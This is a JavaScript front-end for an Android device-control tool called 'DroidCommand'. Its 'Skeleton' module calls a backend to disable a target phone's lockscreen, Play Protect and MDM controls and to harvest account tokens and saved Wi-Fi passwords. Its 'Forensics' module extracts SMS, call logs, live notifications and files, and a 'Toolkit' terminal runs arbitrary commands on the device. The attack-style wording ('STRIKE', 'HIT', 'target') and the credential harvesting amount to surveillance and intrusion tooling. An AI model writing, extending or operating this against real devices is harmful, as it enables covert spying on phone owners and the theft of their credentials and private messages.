// ============================================================
// DroidCommand PWA // Advanced Modules: Skeleton, Forensics, Toolkit
// ============================================================

// ============================================================
// 1. SKELETON: Neutralizer & Credential Harvester
// ============================================================
window.Skeleton = (function () {
  async function neutralizeSecurity() {
    if (!STATE.activeSerial) { pushFlow('ALERT', 'No target selected — arm a device first.'); return; }  // fix: never fire blind
    if (!confirm('Execute Skeleton Neutralizer? This will disable lockscreen, Play Protect, and security controls on the target.')) return;
    const serial = STATE.activeSerial;  // fix: snapshot — the 4s poll may rebuild the selector mid-flight
    pushFlow('STRIKE', 'Neutralizing device security posture...');
    try {
      const res = await api('/api/skeleton/neutralize', {
        method: 'POST',
        body: JSON.stringify({ serial })
      });
      if (res.success) {
        pushFlow('HIT', `Security neutralized: ${res.neutralized ? res.neutralized.join(', ') : 'All gates down'}`);
        loadPosture();
      } else {
        pushFlow('ALERT', `Neutralization error: ${res.error || res.message || 'Unknown failure'}`);
      }
    } catch (e) {
      pushFlow('ALERT', `Skeleton error: ${e.message}`);
    }
  }

  async function restoreSecurity() {
    if (!STATE.activeSerial) { pushFlow('ALERT', 'No target selected — arm a device first.'); return; }  // fix: never fire blind
    const serial = STATE.activeSerial;  // fix: snapshot at press
    pushFlow('SYS', 'Restoring security posture from baseline snapshot...');
    try {
      const res = await api('/api/skeleton/restore', {
        method: 'POST',
        body: JSON.stringify({ serial })
      });
      if (res.success) {
        pushFlow('HIT', 'Security baseline restored.');
        loadPosture();
      } else {
        pushFlow('ALERT', `Restore failed: ${res.error || res.message || 'Unknown failure'}`);
      }
    } catch (e) {
      pushFlow('ALERT', `Restore failed: ${e.message}`);
    }
  }

  async function loadPosture() {
    const el = document.getElementById('skeletonPostureDetails');
    if (!el) return;
    if (!STATE.activeSerial) {
      el.innerHTML = '<div style="color: var(--text-graphite);">Connect target to inspect security posture.</div>';
      return;  // fix: no empty-serial queries against the default device
    }
    try {
      const res = await api(`/api/skeleton/creds/posture?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      el.innerHTML = `
        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;">
          <div class="stat-badge">SELinux: <strong>${res.selinux || 'Enforcing'}</strong></div>
          <div class="stat-badge">Keyguard: <strong>${res.keyguard ? 'Secured' : 'Disarmed'}</strong></div>
          <div class="stat-badge">Knox/MDM: <strong>${res.knox ? 'Active' : 'Bypassed'}</strong></div>
          <div class="stat-badge">Play Protect: <strong>${res.play_protect ? 'Active' : 'Suppressed'}</strong></div>
        </div>
      `;
    } catch (e) {
      el.innerHTML = '<div style="color: var(--text-graphite);">Connect target to inspect security posture.</div>';
    }
  }

  async function harvestCredentials() {
    const list = document.getElementById('harvestedCredsList');
    if (list) list.innerHTML = '<div style="color: var(--text-graphite); padding: 12px;">Harvesting account tokens and passwords...</div>';
    pushFlow('STRIKE', 'Harvesting account tokens and stored secrets...');

    try {
      let accFail = null, wifiFail = null;  // fix: a dead source is an error, not an empty result
      const [accs, wifis] = await Promise.all([
        api(`/api/skeleton/creds/accounts?serial=${encodeURIComponent(STATE.activeSerial || '')}`)
          .catch(e => { accFail = e.message; return { accounts: [] }; }),
        api(`/api/toolkit/wifi-passwords?serial=${encodeURIComponent(STATE.activeSerial || '')}`)
          .catch(e => { wifiFail = e.message; return { passwords: [] }; })
      ]);

      let html = '';
      if (accs.accounts && accs.accounts.length > 0) {
        html += '<div style="font-weight: 700; font-size: 11px; margin-bottom: 6px; color: var(--ember);">ACCOUNTS & IDENTITIES:</div>';
        accs.accounts.forEach(a => {
          html += `<div class="target-card"><span>${escapeHtml(a.type || 'Account')}</span><strong>${escapeHtml(a.name)}</strong></div>`;
        });
      }

      if (wifis.passwords && wifis.passwords.length > 0) {
        html += '<div style="font-weight: 700; font-size: 11px; margin: 12px 0 6px; color: var(--ember);">EXTRACTED WI-FI KEYS:</div>';
        wifis.passwords.forEach(w => {
          html += `<div class="target-card"><span>${escapeHtml(w.ssid)}</span><code style="color: var(--emerald);">${escapeHtml(w.password || 'None')}</code></div>`;
        });
      }

      if (!html) {
        html = '<div style="color: var(--text-graphite); padding: 12px;">No stored credentials recovered on current privilege level.</div>';
      }
      if (accFail || wifiFail) {
        const parts = [];
        if (accFail) parts.push(`accounts (${accFail})`);
        if (wifiFail) parts.push(`wifi (${wifiFail})`);
        html += `<div style="color: var(--amber); padding: 8px 12px; font-family: var(--font-mono); font-size: 11px;">Partial failure: ${escapeHtml(parts.join(', '))}</div>`;
      }

      if (list) list.innerHTML = html;
      pushFlow('HIT', 'Credential triage complete.');
    } catch (e) {
      if (list) list.innerHTML = `<div style="color: var(--ruby);">Harvest failed: ${e.message}</div>`;
    }
  }

  return {
    neutralizeSecurity,
    restoreSecurity,
    loadPosture,
    harvestCredentials
  };
})();

// ============================================================
// 2. FORENSICS & COMMS
// ============================================================
window.Forensics = (function () {
  let activeTab = 'sms';
  let currentPath = '/sdcard';
  let filesGen = 0;  // fix: request sequencing — rapid dir clicks never paint stale dirs

  function switchTab(tabName) {
    activeTab = tabName;
    try { localStorage.setItem('fx.tab', tabName); } catch (e) {}
    document.querySelectorAll('.forensic-tab-btn').forEach(b => {
      b.classList.toggle('active', b.dataset.tab === tabName);
    });
    document.querySelectorAll('.forensic-view').forEach(v => {
      v.style.display = v.id === `forensic-${tabName}` ? 'block' : 'none';
    });

    if (tabName === 'sms') loadSms();
    if (tabName === 'calls') loadCalls();
    if (tabName === 'files') loadFiles(currentPath);
    if (tabName === 'notifications') loadNotifications();
  }

  async function loadSms() {
    const list = document.getElementById('forensicSmsList');
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 16px;">Extracting SMS messages...</div>';

    try {
      const res = await api(`/api/comms/sms?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (res.messages && res.messages.length > 0) {
        list.innerHTML = '';
        res.messages.forEach(m => {
          const row = document.createElement('div');
          row.className = 'target-card';
          row.style.alignItems = 'flex-start';
          row.innerHTML = `
            <div style="flex: 1;">
              <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px;">
                <strong style="color: var(--ember);">${escapeHtml(m.address || 'Unknown')}</strong>
                <span style="color: var(--text-faint);">${m.date || ''}</span>
              </div>
              <div style="color: var(--text-body); font-size: 12.5px;">${escapeHtml(m.body || '')}</div>
            </div>
          `;
          list.appendChild(row);
        });
      } else {
        list.innerHTML = '<div style="color: var(--text-graphite); padding: 16px;">No SMS conversations recovered.</div>';
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 16px;">Failed to load SMS: ${e.message}</div>`;
    }
  }

  async function loadCalls() {
    const list = document.getElementById('forensicCallsList');
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 16px;">Extracting call logs...</div>';

    try {
      const res = await api(`/api/comms/calls?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (res.calls && res.calls.length > 0) {
        list.innerHTML = '';
        res.calls.forEach(c => {
          const row = document.createElement('div');
          row.className = 'target-card';
          row.innerHTML = `
            <div>
              <strong>${escapeHtml(c.name || c.number || 'Unknown')}</strong>
              <span style="color: var(--text-faint); font-size: 11px; margin-left: 8px;">${c.date || ''}</span>
            </div>
            <span class="status-pill">${escapeHtml(c.type || 'Call')} (${c.duration || '0'}s)</span>
          `;
          list.appendChild(row);
        });
      } else {
        list.innerHTML = '<div style="color: var(--text-graphite); padding: 16px;">No call logs found.</div>';
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 16px;">Error: ${e.message}</div>`;
    }
  }

  async function loadFiles(path) {
    currentPath = path || '/sdcard';
    try { localStorage.setItem('fx.path', currentPath); } catch (e) {}
    const gen = ++filesGen;
    const list = document.getElementById('forensicFilesList');
    const pathEl = document.getElementById('currentFilePathDisplay');
    if (pathEl) pathEl.textContent = currentPath;
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 16px;">Listing remote filesystem...</div>';

    try {
      const res = await api('/api/files/list', {
        method: 'POST',
        body: JSON.stringify({ path: currentPath, serial: STATE.activeSerial })
      });

      if (gen !== filesGen) return;  // fix: the slowest response never wins
      const files = res.files || res.items;  // fix: accept both backend shapes
      if (files) {
        list.innerHTML = '';
        // Up Directory Button
        if (currentPath !== '/' && currentPath !== '') {
          const upRow = document.createElement('div');
          upRow.className = 'target-card';
          upRow.style.cursor = 'pointer';
          upRow.innerHTML = '<strong>📁 .. [Parent Directory]</strong>';
          upRow.onclick = () => {
            const parent = currentPath.split('/').slice(0, -1).join('/') || '/';
            loadFiles(parent);
          };
          list.appendChild(upRow);
        }

        files.forEach(f => {
          const row = document.createElement('div');
          row.className = 'target-card';
          const isDir = f.is_dir;
          row.innerHTML = `
            <div style="display: flex; align-items: center; gap: 8px; cursor: ${isDir ? 'pointer' : 'default'};">
              <span>${isDir ? '📁' : '📄'}</span>
              <strong>${escapeHtml(f.name)}</strong>
              ${!isDir ? `<span style="font-size: 10.5px; color: var(--text-faint);">(${f.size || '0 B'})</span>` : ''}
            </div>
            ${!isDir ? `
              <button class="action-pill" style="padding: 3px 10px; font-size: 10.5px;" onclick="window.open('/api/files/download?path=${encodeURIComponent(currentPath + '/' + f.name)}&token=${window.__DC_TOKEN__}')">
                Download
              </button>
            ` : ''}
          `;

          if (isDir) {
            row.onclick = () => loadFiles(`${currentPath === '/' ? '' : currentPath}/${f.name}`);
          }
          list.appendChild(row);
        });
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 16px;">Filesystem read error: ${e.message}</div>`;
    }
  }

  async function loadNotifications() {
    const list = document.getElementById('forensicNotificationsList');
    if (!list) return;
    list.innerHTML = '<div style="color: var(--text-graphite); padding: 16px;">Extracting live notifications...</div>';

    try {
      const res = await api(`/api/exploit/notifications?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (res.notifications && res.notifications.length > 0) {
        list.innerHTML = '';
        res.notifications.forEach(n => {
          const row = document.createElement('div');
          row.className = 'target-card';
          row.innerHTML = `
            <div>
              <span style="color: var(--ember); font-weight: 700;">[${escapeHtml(n.pkg || 'App')}]</span>
              <strong>${escapeHtml(n.title || '')}</strong>: ${escapeHtml(n.text || '')}
            </div>
          `;
          list.appendChild(row);
        });
      } else {
        list.innerHTML = '<div style="color: var(--text-graphite); padding: 16px;">No notifications active on status bar.</div>';
      }
    } catch (e) {
      list.innerHTML = `<div style="color: var(--ruby); padding: 16px;">Error: ${e.message}</div>`;
    }
  }

  function onShow() {
    // fix: restore the operator's last forensic tab/path instead of forcing 'sms'
    let tab = 'sms';
    try {
      tab = localStorage.getItem('fx.tab') || 'sms';
      const p = localStorage.getItem('fx.path');
      if (p) currentPath = p;
    } catch (e) {}
    switchTab(['sms', 'calls', 'files', 'notifications'].includes(tab) ? tab : 'sms');
  }

  return {
    switchTab,
    onShow,
    loadSms,
    loadCalls,
    loadFiles,
    loadNotifications
  };
})();

// ============================================================
// 3. DEEP TOOLKIT & TERMINAL
// ============================================================
window.Toolkit = (function () {
  function appendTerminal(out, text) {
    // fix: cap the scrollback — the box must not grow without bound
    const MAX_CHARS = 200000;
    out.textContent = (out.textContent + text).slice(-MAX_CHARS);
    out.scrollTop = out.scrollHeight;
  }

  async function execTerminal() {
    const input = document.getElementById('terminalCommandInput');
    const out = document.getElementById('terminalOutputBox');
    if (!input || !out) return;

    const cmd = input.value.trim();
    if (!cmd) return;

    input.value = '';
    appendTerminal(out, `\n$ ${cmd}\n`);

    try {
      const res = await api('/api/terminal/exec', {
        method: 'POST',
        body: JSON.stringify({ command: cmd, serial: STATE.activeSerial })
      });

      appendTerminal(out, res.output || '(No output returned)\n');
    } catch (e) {
      appendTerminal(out, `Error: ${e.message}\n`);
    }
  }

  async function runCveScan() {
    const box = document.getElementById('cveScanResultBox');
    if (box) box.textContent = 'Executing automated CVE heuristic audit across system components...';
    pushFlow('SYS', 'Running CVE audit scanner...');

    try {
      const res = await api(`/api/toolkit/cve-scan?serial=${encodeURIComponent(STATE.activeSerial || '')}`);
      if (box) {
        box.textContent = JSON.stringify(res, null, 2);
      }
      pushFlow('HIT', 'CVE vulnerability audit complete.');
    } catch (e) {
      if (box) box.textContent = `Audit error: ${e.message}`;
    }
  }

  return {
    execTerminal,
    runCveScan
  };
})();
